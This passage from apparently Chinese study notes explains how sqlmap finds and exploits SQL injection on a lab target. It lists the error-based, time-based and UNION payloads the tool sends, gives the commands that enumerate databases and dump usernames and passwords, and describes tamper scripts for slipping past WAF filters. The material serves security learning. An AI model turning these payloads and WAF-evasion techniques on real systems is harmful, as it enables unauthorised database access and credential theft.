- MySQL>=5.5 OR error based-WHERE OR HAVING clause（EXP）
- MySQL>=5.6 AND error based-WHERE、HAVING、ORDER BY或GROUP BY子句（GTID_SUBSET）

最终得出结论：GET参数“id”是“MySQL>=5.6 AND error based-WHERE、HAVING、ORDER BY或GROUP BY子句（GTID_SUBSET）”可注入
![image.png](_img/02-Web安全/01-基础知识/1664418465814-266c4d03-bacb-4fce-8e71-3db97ee1b96c.png)
这里是通过报错语句<br />`1' AND GTID_SUBSET(CONCAT(0x7178627171,(SELECT (ELT(2691=2691,1))),0x717a627171),2691) AND 'dqhD'='dqhD`<br />来确定此处存在报错注入，`1'`为真，后面使用`CONCAT`将`0x7178627171`和`0x717a627171`使用`1`分割并聚合输出，最后面的`AND 'dqhD'='dqhD`为真。

3、SQLMAP发出Payload：
```
ID:(SELECT CONCAT(0x7178627171,(ELT(8203=8203,1)),0x717a627171))
```
测试“MySQL>=5.0.12堆栈查询（注释）”，并没有得出结果
![image.png](_img/02-Web安全/01-基础知识/1664418502798-69b364c5-2a6d-4ffb-907e-2f7d14a022f5.png)

4、SQLMAP发出Payload：
```
ID:1';SELECT SLEEP(5)#
ID:1';SELECT SLEEP(5) AND 'ZmQe'='ZmQe
ID:1';(SELECT * FROM (SELECT(SLEEP(5)))cohu)#
ID:1';(SELECT * FROM (SELECT(SLEEP(5)))rGkW) AND 'LFDd'='LFDd
ID:1';SELECT BENCHMARK(5000000,MD5(0x69735357))#
ID:1';SELECT BENCHMARK(5000000,MD5(0x4e4e6672)) AND 'CGiY'='CGiY
ID:1' AND (SELECT 2135 FROM (SELECT(SLEEP(5)))wehJ) AND 'hzXx'='hzXx
ID:1' AND (SELECT 2135 FROM (SELECT(SLEEP(0)))wehJ) AND 'hzXx'='hzXx
ID:1' AND (SELECT 2135 FROM (SELECT(SLEEP(5)))wehJ) AND 'hzXx'='hzXx
```
SQLMAP首先告诉我们基于时间的比较需要更大的统计模型，请稍候……<br />然后分别进行了以下测试

- 测试“MySQL>=5.0.12堆叠查询”
- 测试“MySQL>=5.0.12堆叠查询（查询SLEEP-注释）”
- 测试“MySQL>=5.0.12堆栈查询（查询SLEEP）”
- 测试“MySQL<5.0.12堆叠查询（BENCHMARK-注释）”
- 测试“MySQL<5.0.12堆叠查询（BENCHMARK）”
- 测试“MySQL>=5.0.12 AND time-based blind（query SLEEP）”

最终得出结论<br />GET参数“id”似乎是“MySQL>=5.0.12 AND time-based blind（query SLEEP）”可注入
![image.png](_img/02-Web安全/01-基础知识/1664418691382-e8bd700a-65f4-437d-95fa-c188003ddfe1.png)

这里是根据

- ID:1' AND (SELECT 2135 FROM (SELECT(SLEEP(5)))wehJ) AND 'hzXx'='hzXx
- ID:1' AND (SELECT 2135 FROM (SELECT(SLEEP(0)))wehJ) AND 'hzXx'='hzXx
- ID:1' AND (SELECT 2135 FROM (SELECT(SLEEP(5)))wehJ) AND 'hzXx'='hzXx

来得到判断结果的，`1'`为真，后面的当sleep(5)时，页面延迟5秒放返回结果，当sleep(0)时，页面立即返回结果，说明此处存在时间盲注。

5、SQLMAP发出Payload：
```
ID:1' ORDER BY 1-- -
ID:1' ORDER BY 2161-- -
ID:1' ORDER BY 10-- -
ID:1' ORDER BY 6-- -
ID:1' ORDER BY 4-- -
ID:1' ORDER BY 3-- -
```
SQLMAP准备测试通用UNION查询（NULL）-1到20列，然后自动扩展UNION查询注入技术测试的范围，因为至少找到了一种其他（潜在）技术，最后得出结论目标URL在查询中似乎有3列
![image.png](_img/02-Web安全/01-基础知识/1664418930995-282389c2-04a7-4433-852f-c4b208e61cb3.png)

这里是根据`1' ORDER BY 4-- -`和`1' ORDER BY 3-- -`来得到存在3列的结果。当`ORDER BY 4`时，页面返回错误，`ORDER BY 3`时页面返回正确，说明有3列

6、SQLMAP发出Payload：
```
ID:1' UNION ALL SELECT CONCAT(0x7178627171,0x78624e42526c7a574d4772626f4a5966646a544e6e774965545250564f5762496161584647526376,0x717a627171),NULL,NULL-- -
ID:1' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,0x52447957476e6e656e7761747743726b47564e624b476771547959435451427365436b5a6278564b,0x717a627171)-- -
ID:1' UNION ALL SELECT NULL,CONCAT(0x7178627171,0x6445716e5977705476635767545475716a58495875414a41417170617064616972666953624d5764,0x717a627171),NULL-- -
ID:1' UNION ALL SELECT CONCAT(0x7178627171,0x755757796d6959715675,0x717a627171),NULL,NULL-- -
ID:1' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,0x796b455044636d646d6e,0x717a627171)-- -
ID:1' UNION ALL SELECT NULL,CONCAT(0x7178627171,0x784f55576d584666775a,0x717a627171),NULL-- -
ID:-7888' UNION ALL SELECT CONCAT(0x7178627171,0x506f49755745585758766b7a75456354777842686873417a6e676d65724b706b5957706971735945,0x717a627171),NULL,NULL-- -
ID:-3561' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,0x487374514e586872784a6f4f66514f4e4f794565786f66616e564353496b724f50676342574c7378,0x717a627171)-- -
ID:-6950' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,(CASE WHEN (8536=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                8536) THEN 1 ELSE 0 END),0x717a627171)-- -
ID:-7616' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x717a627171)-- -
ID:-3959' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x717a627171)-- -
ID:-6395' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x717a627171)-- -
ID:-2267' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x717a627171)-- -
ID:-1941' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x717a627171)-- -
ID:-8709' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x717a627171)-- -
```
Payload中的前六条中，每三条为一组，是为了判断在前面使用`order by`判断出的3列中，哪一列能够成功输出内容；<br />第七和第八两条Payload是为了确认是否是第三列能够成功输出；<br />后面剩下的几条是为了确定最终可以执行的Payload而做的测试；<br />最终得到结论：GET参数“id”是“Generic UNION query（NULL）-1到20 columns”可注入。
![image.png](_img/02-Web安全/01-基础知识/1664430034743-907a9d6f-e5e4-4008-a7aa-3c148fc1b8f5.png)

7、最后SQLMAP询问你想继续测试其他人（如果有的话）吗？有则继续测试，没有则输出结论
```
sqlmap通过总共50个HTTP请求确定了以下注入点：
---
参数：id（GET）

类型：基于布尔值的盲注
标题：基于AND布尔值的盲注-WHERE或HAVING子句
有效载荷：id=1' AND 9766=9766 AND 'jUDc'='jUDc

类型：基于错误
标题：MySQL>=5.6 AND错误-WHERE、HAVING、ORDER BY或GROUP BY子句（GTID_SUBSET）
有效载荷：1' AND GTID_SUBSET(CONCAT(0x7176716b71,(SELECT (ELT(7796=7796,1))),0x71626a6b71),7796) AND 'BSBE'='BSBE

类型：基于时间的盲注
标题：MySQL>=5.0.12 AND基于时间的盲注（查询SLEEP）
有效载荷： id=1' AND (SELECT 2880 FROM (SELECT(SLEEP(5)))omFj) AND 'LCiX'='LCiX

类型：UNION查询
标题：通用UNION查询（NULL）-3列
有效载荷：id=-6358' UNION ALL SELECT NULL,NULL,CONCAT(0x7176716b71,0x56734463457752494b4948484e45694d676f4e4f6643664a627868774b5351747272505372525363,0x71626a6b71)-- -
---

后端DBMS为MySQL
web应用技术：Nginx 1.15.11，PHP 5.6.9
后端DBMS:MySQL>=5.6
```
![image.png](_img/02-Web安全/01-基础知识/1664419463797-d6baf047-39fa-4553-94cb-7356640aa5f6.png)


## 3.4、参数分析
**输入命令**
```
 python sqlmap.py -u "http://192.168.10.3/sql/Less-1/?id=1" --dbs
```

SQLMAP发出Payload：
```
ID:-5826' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,JSON_ARRAYAGG(CONCAT_WS(0x676e657a7262,schema_name)),0x717a627171) FROM INFORMATION_SCHEMA.SCHEMATA-- -
```
这里的SQL语句中的`-5826'`为假，然后执行后面的`Union`语句，`SELECT NULL,NULL,`是因为在前面用`order by`探测出有3列所以这里有两个`null`，`CONCAT`将结果聚合输出，`CONCAT_WS`将结果之间使用字符串分割输出，后面的SQL语句都是基于这个结构的就不进行描述。

SQLMAP首先会恢复后端DBMS“mysql”然后测试与目标URL的连接，从存储会话恢复了注入点（就是上面总结的部分），然后输出得到的数据库名称
![image.png](_img/02-Web安全/01-基础知识/1664419902136-b3aa8f51-73f4-4ef5-845b-d8ccadd790ab.png)

**输入命令**
```
python sqlmap.py -u "http://192.168.10.3/sql/Less-1/?id=1" -D security --tables
```

SQLMAP发出Payload：
```
ID:-6898' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,JSON_ARRAYAGG(CONCAT_WS(0x676e657a7262,table_name)),0x717a627171) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x7365637572697479)-- -
```

同上面一样首先恢复后端DBMS“mysql”然后测试与目标URL的连接，从存储会话恢复了注入点（就是上面总结的部分），然后输出得到security数据库中的表名
![image.png](_img/02-Web安全/01-基础知识/1664420009703-e2a74a39-656f-4d0e-8aa4-4c1e9b5b5f67.png)

**输入命令**
```
python sqlmap.py -u "http://192.168.10.3/sql/Less-1/?id=1" -D security -T users --columns
```

SQLMAP发出Payload：
```
ID:-6565' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,JSON_ARRAYAGG(CONCAT_WS(0x676e657a7262,column_name,column_type)),0x717a627171) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x7365637572697479-- -
```
![image.png](_img/02-Web安全/01-基础知识/1664420173707-46e3fd46-116d-4118-be96-56a255bf5be7.png)

**输入命令**
```
python sqlmap.py -u "http://192.168.10.3/sql/Less-1/?id=1" -D security -T users -C username,password --dump
```

SQLMAP发出Payload：
```
ID:-8341' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627171,JSON_ARRAYAGG(CONCAT_WS(0x676e657a7262,password,username)),0x717a627171) FROM security.users-- -
```
![image.png](_img/02-Web安全/01-基础知识/1664420223383-27968240-24b1-460d-97e4-71ac9ceb26d4.png)


# 四、SQLMAP中的Tamper

## 4.1、何为Tamper
SQLMAP中的Tamper就是SQLMAP中自带的一些脚本，能够在使用SQLMAP时对参数进行编码转换，在一定程度上可以避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。<br />SQLMAP自带的Tamper就在SQLMAP文件夹下的Tamper文件夹中，一共是有65个tamper可供使用。
![image.png](_img/02-Web安全/01-基础知识/1664433811008-d805d3ce-ba29-4d62-a808-82eac3610319.png)

**用法**
```python
python sqlmap.py -u "http://xmtxsec.top/test.php/?id=1"  --tamper=xxx.py
```


## 4.2、SQLMAP自带的Tamper
这个就不仔细介绍了，在`sqlmap/tamper/`目录里面的Tamper打开都能看到功能介绍，而且有应用例子。

比如`0eunion.py`
![image.png](_img/02-Web安全/01-基础知识/1664434390872-693f6d5b-fe1a-4fa2-94d7-8c1665381353.png)
里面就有描述是将空格转换为`e0`

而且在网上也有很多文章对SQLMAP中的Tamper进行了介绍<br />这里贴出信安之路良哥的一篇文章


## 4.3、Tamper的结构
打开SQLMAP自带的Tamper我们会发现一个tamper脚本基本由`priority`、`dependencies`和`tamper`组成
![image.png](_img/02-Web安全/01-基础知识/1664434745366-df500963-51ca-48b6-b3b9-e5226c9e5e55.png)

**1、priority：**<br />用来定义该脚本的优先级，如果使用了多个Tamper，sqlmap会根据priority的参数等级来优先使用等级较高的Tamper，可以根据实际需要来设置。

编写：
```python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST
```

参数：
```python
LOWEST = -100
LOWER = -50
LOW = -10
NORMAL = 0
HIGH = 10
HIGHER = 50
HIGHEST = 100
```

**2、dependencies：**<br />用来声明该脚本的适用范围，也可以不写。

编写
```python
#没写，就是没有提示，不写也行就直接pass
def dependencies():
     singleTimeWarnMessage("这里输入想显示的内容“)
```
或者
```python
def dependencies():
     pass
```

**3、tamper**<br />接受的参数`payload`和`**kwargs`，返回值为替换后的payload，`kwargs` 参数则与`header` 信息有关

编写
```python
def tamper(payload, **kwargs):
    return payload.replace('union','uniounionn')
```
